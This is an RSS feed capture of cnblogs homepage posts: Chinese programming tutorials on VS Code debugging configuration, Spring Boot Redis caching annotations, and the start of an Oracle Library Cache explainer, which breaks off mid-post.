<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>vscode 文档学习笔记 —— 调试 - 小蒋不素小蒋</title>
<link>http://www.cnblogs.com/xjnotxj/p/9437528.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xjnotxj/p/9437528.html</guid>
<description>&lt;hr/&gt;&lt;h3 id=&quot;选择你的项目&quot;&gt;1、选择你的项目&lt;/h3&gt;
&lt;p&gt;￼&lt;img src=&quot;https://images2018.cnblogs.com/blog/896608/201808/896608-20180807155449204-1353909976.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;选择你项目的语言&quot;&gt;2、选择你项目的语言&lt;/h3&gt;
&lt;p&gt;￼&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/896608/201808/896608-20180807155452550-1224910153.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;当前项目路径下生成-.vscodelaunch.json-文件&quot;&gt;3、当前项目路径下生成 &lt;code&gt;.vscode/launch.json&lt;/code&gt; 文件&lt;/h3&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;{
    // Use IntelliSense to learn about possible attributes.
    // Hover to view descriptions of existing attributes.
    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387
    &quot;version&quot;: &quot;0.2.0&quot;,
    &quot;configurations&quot;: [
        {
            &quot;type&quot;: &quot;node&quot;,
            &quot;request&quot;: &quot;launch&quot;,
            &quot;name&quot;: &quot;Launch Program&quot;,
            &quot;program&quot;: &quot;${workspaceFolder}/test.js&quot;
        }
    ]
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;type - 用于此启动配置的调试器类型。每个安装的调试扩展都会引入一种类型，例如，node 内置节点调试器，php 以及 goPHP 和 Go 扩展。&lt;/p&gt;
&lt;p&gt;request - 此启动配置的请求类型。目前支持的是 launch 和 attach。(request的详解见下面的第&lt;code&gt;三&lt;/code&gt;章)&lt;/p&gt;
&lt;p&gt;name - 友好名称，显示在“调试启动配置”下拉列表中。&lt;/p&gt;
&lt;p&gt;program - 启动调试器时要运行的可执行文件或文件&lt;/p&gt;
&lt;p&gt;args - 传递给程序进行调试的参数&lt;/p&gt;
&lt;p&gt;env- 环境变量（该值 null 可用于“取消定义”变量）&lt;/p&gt;
&lt;p&gt;cwd - 当前工作目录，用于查找依赖项和其他文件&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;注1：&lt;code&gt;${workspaceFolder}&lt;/code&gt; 表示工作空间文件夹的根路径，&lt;code&gt;${file}&lt;/code&gt; 表示活动编辑器中打开的文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;注2：&lt;code&gt;”program&quot;: &quot;${workspaceFolder}/test.js”&lt;/code&gt;，我不太清楚 vscode 是怎么识别我想要调试当前目录下的 &lt;code&gt;/test.js&lt;/code&gt;。&lt;strong&gt;[待解决]&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;注3：还可以把配置文件写进 &lt;code&gt;User Settings&lt;/code&gt; 成为全局配置&lt;br/&gt;￼&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/896608/201808/896608-20180807155501696-1553894075.png&quot;/&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;快速回到你的配置文件&quot;&gt;4、快速回到你的配置文件&lt;/h3&gt;
&lt;p&gt;￼&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/896608/201808/896608-20180807155505527-2036325501.png&quot;/&gt;&lt;/p&gt;

&lt;hr/&gt;&lt;h3 id=&quot;breakpoint-传统断点&quot;&gt;1、Breakpoint (传统断点)&lt;/h3&gt;
&lt;p&gt;（1）图形用圆形代替&lt;br/&gt;（2）不可以打在空行上&lt;/p&gt;
&lt;p&gt;￼&lt;img src=&quot;https://images2018.cnblogs.com/blog/896608/201808/896608-20180807155511557-769146328.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;logpoint&quot;&gt;2、Logpoint&lt;/h3&gt;
&lt;p&gt;（1）可以在 debug console 里打印出信息（用 &lt;code&gt;{}&lt;/code&gt; 包裹表达式）&lt;br/&gt;（2）图形用菱形代替&lt;br/&gt;（3）如果不打在语句上，而是空行，则调试执行的时候，会消失，但不影响效果。所以还是推荐打在语句上！&lt;/p&gt;
&lt;p&gt;￼&lt;img src=&quot;https://images2018.cnblogs.com/blog/896608/201808/896608-20180807155515851-1788703422.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;conditional-breakpoint&quot;&gt;3、Conditional Breakpoint&lt;/h3&gt;
&lt;p&gt;分两种条件：&lt;code&gt;表达式&lt;/code&gt; / &lt;code&gt;命中数&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;（1）可以在符合条件时中断到离此断点下方最近的一条语句上。&lt;br/&gt;（2）图形用正方形代替&lt;br/&gt;（3）如果不打在语句上，而是空行，则调试执行的时候，会消失，但不影响效果。&lt;/p&gt;

&lt;hr/&gt;&lt;p&gt;第&lt;code&gt;一&lt;/code&gt;章提到的 &lt;code&gt;launch.json&lt;/code&gt; 配置文件里有 &lt;code&gt;request&lt;/code&gt; 字段，取值范围为：&lt;code&gt;launch&lt;/code&gt; 和 &lt;code&gt;attach&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;launch&lt;/code&gt;：vscod e独立自主的跑起一个调试进程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;attach&lt;/code&gt;：你通过 &lt;code&gt;node --inspect-brk xxx.js&lt;/code&gt; 自行启动调试，然后 vscode 再去 attach 它&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面就分这两类来说说具体调试方式的区别。&lt;/p&gt;
&lt;h3 id=&quot;launch-方式&quot;&gt;1、launch 方式&lt;/h3&gt;
&lt;hr/&gt;&lt;h5 id=&quot;点击-launch-program&quot;&gt;（1）点击 &lt;code&gt;Launch Program&lt;/code&gt;&lt;/h5&gt;
&lt;p&gt;￼&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/896608/201808/896608-20180807155520699-824595031.png&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;选择启动哪个配置文件&quot;&gt;（2）选择启动哪个配置文件&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/896608/201808/896608-20180807155525279-960927123.png&quot;/&gt;&lt;br/&gt;￼&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;注：&lt;code&gt;launch.json&lt;/code&gt; 配置文件中 &lt;code&gt;name&lt;/code&gt; 属性的值会显示在这个下拉列表中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;开始调试&quot;&gt;（3）开始调试&lt;/h5&gt;
&lt;h3 id=&quot;attach-方式&quot;&gt;2、attach 方式&lt;/h3&gt;
&lt;hr/&gt;&lt;h5 id=&quot;把-auto-attachon-打开&quot;&gt;（1）把 &lt;code&gt;Auto Attach：On&lt;/code&gt; 打开&lt;/h5&gt;
&lt;p&gt;￼&lt;img src=&quot;https://images2018.cnblogs.com/blog/896608/201808/896608-20180807155538463-1164912390.png&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;以调试的方式启动-node&quot;&gt;（2）以调试的方式启动 node&lt;/h5&gt;
&lt;pre&gt;
&lt;code&gt;node --inspect-brk test.js&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;开始调试-1&quot;&gt;（3）开始调试&lt;/h5&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;注1：调试的时候，可以同时运行程序&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;注2：当修改代码，同时运行的程序会立即生效，而调试的代码还是老的&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr/&gt;&lt;p&gt;需求：同时调试 &lt;code&gt;server.js&lt;/code&gt; 和 &lt;code&gt;client.js&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;建立配置文件&quot;&gt;1、建立配置文件&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;{
    &quot;version&quot;: &quot;0.2.0&quot;,
    &quot;configurations&quot;: [
        {
            &quot;type&quot;: &quot;node&quot;,
            &quot;request&quot;: &quot;launch&quot;,
            &quot;name&quot;: &quot;Server&quot;,
            &quot;program&quot;: &quot;${workspaceFolder}/server.js&quot;,
            &quot;cwd&quot;: &quot;${workspaceFolder}&quot;
        },
        {
            &quot;type&quot;: &quot;node&quot;,
            &quot;request&quot;: &quot;launch&quot;,
            &quot;name&quot;: &quot;Client&quot;,
            &quot;program&quot;: &quot;${workspaceFolder}/client.js&quot;,
            &quot;cwd&quot;: &quot;${workspaceFolder}&quot;
        }
    ],
    &quot;compounds&quot;: [
        {
            &quot;name&quot;: &quot;Server/Client&quot;,
            &quot;configurations&quot;: [&quot;Server&quot;, &quot;Client&quot;]
        }
    ]
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;开始调试-2&quot;&gt;2、开始调试&lt;/h3&gt;
&lt;p&gt;￼&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/896608/201808/896608-20180807155543435-911241672.png&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;参考资料&quot;&gt;参考资料&lt;/h4&gt;
&lt;hr/&gt;&lt;p&gt;&lt;a href=&quot;https://code.visualstudio.com/docs/editor/debugging#_launch-configurations&quot; class=&quot;uri&quot;&gt;https://code.visualstudio.com/docs/editor/debugging#_launch-configurations&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 07 Aug 2018 07:56:00 +0000</pubDate>
<dc:creator>小蒋不素小蒋</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xjnotxj/p/9437528.html</dc:identifier>
</item>
<item>
<title>SpringBoot 整合redis实现缓存 记录@CachePut值为1 - 曾将</title>
<link>http://www.cnblogs.com/GH0522/p/9437080.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/GH0522/p/9437080.html</guid>
<description>&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;#redis
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; spring.cache.type=&lt;span&gt;REDIS
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; spring.redis.database=0
&lt;span&gt; 4&lt;/span&gt; spring.redis.host=127.0.0.1
&lt;span&gt; 5&lt;/span&gt; pring.redis.password=
&lt;span&gt; 6&lt;/span&gt; spring.redis.port=6379
&lt;span&gt; 7&lt;/span&gt; spring.redis.pool.max-idle=8
&lt;span&gt; 8&lt;/span&gt; spring.redis.pool.min-idle=0  
&lt;span&gt; 9&lt;/span&gt; spring.redis.pool.max-active=100 
&lt;span&gt;10&lt;/span&gt; spring.redis.pool.max-wait=-1
&lt;span&gt;11&lt;/span&gt; #redis
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.gh.redis;


&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Method;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cache.CacheManager;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cache.annotation.CachingConfigurerSupport;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cache.annotation.EnableCaching;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.cache.interceptor.KeyGenerator;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.context.annotation.Bean;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.context.annotation.Configuration;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.data.redis.cache.RedisCacheManager;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.data.redis.connection.RedisConnectionFactory;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.data.redis.core.RedisTemplate;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.data.redis.core.StringRedisTemplate;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.fasterxml.jackson.annotation.JsonAutoDetect;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.fasterxml.jackson.annotation.PropertyAccessor;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.fasterxml.jackson.databind.ObjectMapper;

@Configuration
@EnableCaching
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; RedisConfig &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; CachingConfigurerSupport {
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;定义缓存数据 key 生成策略的bean
    包名+类名+方法名+所有参数
    &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @Bean
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; KeyGenerator wiselyKeyGenerator(){
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; KeyGenerator() {
            @Override
            &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object generate(Object target, Method method, Object... params) {
                StringBuilder sb &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; StringBuilder();
                sb.append(target.getClass().getName());
                sb.append(method.getName());
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; (Object obj : params) {
                    sb.append(obj.toString());
                }
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; sb.toString();
            }
        };
 
    }
 
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;要启用spring缓存支持,需创建一个 CacheManager的 bean，CacheManager 接口有很多实现，这里Redis 的集成，用 RedisCacheManager这个实现类
    Redis 不是应用的共享内存，它只是一个内存服务器，就像 MySql 似的，
    我们需要将应用连接到它并使用某种“语言”进行交互，因此我们还需要一个连接工厂以及一个 Spring 和 Redis 对话要用的 RedisTemplate，
    这些都是 Redis 缓存所必需的配置，把它们都放在自定义的 CachingConfigurerSupport 中
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @Bean
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; CacheManager cacheManager(
            @SuppressWarnings(&lt;/span&gt;&quot;rawtypes&quot;&lt;span&gt;) RedisTemplate redisTemplate) {
        RedisCacheManager cacheManager &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; RedisCacheManager(redisTemplate);
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;        cacheManager.setDefaultExpiration(60);&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置缓存保留时间（seconds）&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt;&lt;span&gt; cacheManager;
    }
 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;1.项目启动时此方法先被注册成bean被spring管理&lt;/span&gt;
&lt;span&gt;    @Bean
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; RedisTemplate&amp;lt;String, String&amp;gt;&lt;span&gt; redisTemplate(
            RedisConnectionFactory factory) {StringRedisTemplate template &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; StringRedisTemplate(factory);
        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; Jackson2JsonRedisSerializer(Object.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;);
        ObjectMapper om &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ObjectMapper();
        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
        om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        jackson2JsonRedisSerializer.setObjectMapper(om);
        template.setValueSerializer(jackson2JsonRedisSerializer);
        template.afterPropertiesSet();
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; template;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;　　1：&lt;span&gt;@Cacheable：当重复使用相同参数调用方法的时候，方法本身不会被调用执行，即方法本身被略过了，取而代之的是方法的结果直接从缓存中找到并返回了。&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;　　实验：在业务逻辑实现方法上加上次注解&lt;/p&gt;
&lt;p&gt;　　其中value指的是要放在哪一个数据缓存里面&lt;/p&gt;
&lt;p&gt;　　　　key指的就是一个键&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;    @Override
    @Cacheable(value&lt;/span&gt;=&quot;db0&quot;,key=&quot;T(String).valueOf(#userid)&quot;)&lt;span&gt;//&lt;/span&gt;&lt;span&gt;把userid转换为string类型的&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; List&amp;lt;GhTest&amp;gt; getGhTestByID(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; userid) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; TODO Auto-generated method stub&lt;/span&gt;
        System.out.println(&quot;aaaaaaa&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; dao.getGhTestByID(userid);
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 　　对接口进行测试&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1306245/201808/1306245-20180807141638023-682933832.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　执行第一次控制台输出aaaaa　　　　　　　　redis里面新建一个键值对&lt;/p&gt;
&lt;p&gt; 　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1306245/201808/1306245-20180807141733635-1639436205.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　再次测试，则不再输出aaaaa 说明数据是在缓存中所取。运行的步骤其实也就是，当&lt;span&gt;@Cacheable&lt;/span&gt;接收到key value的时候先在value中找是不是存在key，如果不存在则在value中新建key 数据值为这个方法的返回值。如果存在则方法不执行从缓存中读取值。&lt;/p&gt;

&lt;h3&gt;　　2：@CacheEvict&lt;/h3&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;@Override
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;     @CacheEvict(value = &quot;db0&quot;, key =&quot;T(String).valueOf(#userid)&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; deleteTest(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; userid) {
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt; TODO Auto-generated method stub&lt;/span&gt;
&lt;span&gt;5&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; dao.deleteTest(userid);
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;     }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　使用接口测试发现，会删除掉数据库和缓存里面的值。可以在@CacheEvict 里面添加condition 表达式，让其满足什么条件的时候才删除缓存。&lt;/p&gt;

&lt;h3&gt;　　3：@CachePut&lt;/h3&gt;
&lt;p&gt;　　&lt;strong&gt;在测试这个修改的时候我遇到了问题，那就是我们平常写的修改和添加返回值一般都是int类型的，也就倒置了缓存里面存的值都是添加或者是修改的行数，并不是真实的数据。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　例如，&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;    @Override
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;     @CachePut(value = &quot;db0&quot;, key =&quot;T(String).valueOf(#test.userid)&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; updateTest(GhTest test) {
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt; TODO Auto-generated method stub&lt;/span&gt;
&lt;span&gt;5&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; dao.updateTest(test);
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;     }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt; 　测试新增一条记录，userid为20，查看发现redis缓存里面是1，而不是userid为20的数据记录&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1306245/201808/1306245-20180807144147021-719779332.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1306245/201808/1306245-20180807144218736-1643431505.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;上面也说了，redis里面存的值，是方法的返回值，我们方法的返回值是int，是被影响的行数。所以会存进去1，那要对方法进行修改。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　解决方案就是，新建方法，把新增或者修改和查询结合这使用。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;@Override
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     @CachePut(value = &quot;db0&quot;, key =&quot;T(String).valueOf(#test.userid)&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; List&amp;lt;GhTest&amp;gt;&lt;span&gt; insertTest2(GhTest test) {
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt; TODO Auto-generated method stub&lt;/span&gt;
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;        insertTest(test);
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;         List&amp;lt;GhTest&amp;gt; list=&lt;span&gt;getGhTestByID(test.getUserid());
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; list;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;    @Override
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     @CachePut(value = &quot;db0&quot;, key =&quot;T(String).valueOf(#test.userid)&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; List&amp;lt;GhTest&amp;gt;&lt;span&gt; updateTest2(GhTest test) {
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt; TODO Auto-generated method stub&lt;/span&gt;
&lt;span&gt;13&lt;/span&gt; &lt;span&gt;        updateTest(test);
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;         List&amp;lt;GhTest&amp;gt; list=&lt;span&gt;getGhTestByID(test.getUserid());
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; list;
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;     }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　再次进行测试，先对20那条记录进行修改，在进行id查询，如果不通过数据库查询就说明成功了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1306245/201808/1306245-20180807145836053-1469544838.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　发现缓存中的值已经被修改，而且根据id查询也是通过缓存查询。&lt;/p&gt;

</description>
<pubDate>Tue, 07 Aug 2018 07:03:00 +0000</pubDate>
<dc:creator>曾将</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/GH0522/p/9437080.html</dc:identifier>
</item>
<item>
<title>Oracle Shared Pool之Library Cache - lhdz_bj</title>
<link>http://www.cnblogs.com/lhdz_bj/p/9436866.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lhdz_bj/p/9436866.html</guid>
<description>
&lt;p&gt;1. Shared Pool组成&lt;br/&gt;　 Shared Pool由许多区间(Extent)组成，这些区间又由多个连续的内存块（Chunk）组成，这些内存块大小不一。从逻辑功能角度，Shared pool主要包含三个部分：Library Cache，Dictionary Cache和Control Structure。而这里，我们主要介绍其中的Library Cache。&lt;br/&gt;2. Library Cache&lt;/p&gt;

&lt;p&gt;　 Library Cache主要用于存储系统中的可执行对象（例如：SQL语句，PL/SQL块及相关对象等）及其相关信息（解析信息，可执行代码，相关对象及信息，相关控制结构等），以便实现这些可执行对象及其相关信息的快速访问和共享。&lt;/p&gt;
&lt;p&gt;3. Hash Bucket&lt;/p&gt;
&lt;p&gt;   Hash Bucket主要用于特定可执行对象的快速定位和存取，每个哈希桶中对应一个将多个可执行对象连接起来的链表，而这些可执行对象在链表中的表现形式就是可执行对象的句柄（Handle），当需要定位或访问特定对象时，系统通过对特定SQL或PL/SQL对象做特定哈希计算，就可以快速得知该特定对象应该位于的哈希桶，而每个哈希桶的链表比较短，尤其是高版本的Oracle中，哈希桶的链表更短，这样，在哈希桶链表中定位和访问特定对象会非常快速。至于Library Cache中哈希桶的数目，系统会根据Shared Pool的大小自动算出，以确保哈希桶在够用的同时，也不会导致哈希桶中对象数目过多而影响定位和访问的效率。哈希桶示意图如下所示。&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected&quot; data-cke-widget-wrapper=&quot;1&quot; data-cke-filter=&quot;off&quot; data-cke-display-name=&quot;图像&quot; data-cke-widget-id=&quot;5&quot;&gt;&lt;img class=&quot;cke_widget_element has&quot; src=&quot;http://img.blog.csdn.net/20180214222158916?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; alt=&quot;&quot; data-cke-saved-src=&quot;http://img.blog.csdn.net/20180214222158916?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; 